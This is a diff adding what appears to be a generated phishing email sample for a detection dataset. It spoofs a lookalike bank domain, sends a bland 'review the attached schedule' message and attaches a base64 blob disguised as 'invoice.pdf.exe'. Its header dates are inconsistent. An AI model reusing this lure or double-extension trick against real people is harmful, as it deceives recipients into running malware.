@@ -1,0 +1,46 @@
+From: notice@wells-fargo-alert.top
+To: victim46@example.com
+Subject: Lunch on Friday? [ref AF7DDCE]
+Date: Tue, 18 Mar 2002 01:23:00 -0500
+Message-ID: <phish-46-e31d2b7b-ea18-4f53-a02c-78f5974bb871@wells-fargo-alert.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 19 Mar 2002 01:52:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 21 Mar 2002 22:34:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 25 Mar 2002 21:09:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 22 Mar 2002 08:26:00 -0500
+Return-Path: <notice@wells-fargo-alert.top>
+Reply-To: notice@wells-fargo-alert.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=wells-fargo-alert.top; dkim=pass header.d=wells-fargo-alert.top; dmarc=pass header.from=wells-fargo-alert.top
+Received-SPF: pass (mx.example.com: domain of notice@wells-fargo-alert.top designates 192.0.2.26 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=wells-fargo-alert.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-46-4ead71c4"
+
+--bnd-p-46-4ead71c4
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: AF7DDCE
+
+Thanks,
+Colleague
+--bnd-p-46-4ead71c4
+Content-Type: application/octet-stream; name="invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice.pdf.exe"
+
+TVqQADsrX0OrYCxq+OT+tNsk0J4RzHahAa6mewDMW/G6ZERS3IFDGWgkUIOTRC4rGIrtHt7SxOyB
+DzmlcXlV/tbS3ypazEdMrPYNVBwY9LABYXZLo7tlEQ998xu6jR9/bX8q6mc6SUSlLy1PJ1nAfmHs
+XhS6eEO77f4AD/Ie2sn4ws7qr/q5PgJsm3sKIk9FPXJvzm4o+uE+l/IAU2DXGSPG0vMXbHmQpqzL
+JnVo0JTJ8Xc77L6BAbl+c0SOpQhJyyaWfX/XY3p2NtT0pNXAb4A8Pp3xa6wppGPnP/q3b+5dQOkn
+dybtAKnfuM6oShOV8B/SOKxMFEeXSnylGR0UZCC2rvFyK3JZHBxjJUuFDfGl66PVXNzeTIx+NGX6
+xfRE6ayMqO/imGQ3ddYdC25xu8L38cgosd+dshVUr+yQd823NjgaHDxWrde9AxCvglrCwqIH7af0
+q0iQjs6UF0fosbt7yINv8SN/wq7f7PLwaWLjOs0gtCb7kOj9GMZecGbaQhKat7/UvIAlUCDx0suq
+srlmJ7riqPhD8Fbx8CmM35ERDE6HTi0PY5e8K07n8bhOZ3qihEGH6FpCQJ01fzqHnaQ6UudRmMsY
+Ka27EWEIq1oIR/urywy8ZSoKDT77uk/D1iZ0THHoDBf+a64FFiw+M7vg8SwRlfxPqit8dRpd5D91
+PRjOv5GoNO2KjNozvrpA2c3kRaMwluDU4PvNZFSnoT60aoCtGJ94qP07OPrTJILaPdJaqngPluZT
+bLTrZSmZvqE0inICLpPxAGQqIM0oQlWiFeBCP5RIsuVxmqYGqTelw7Z6cMz8VVVUCGZHnUVxu1B9
+vQp4bBTOA86YH18SCw==
+
+--bnd-p-46-4ead71c4--
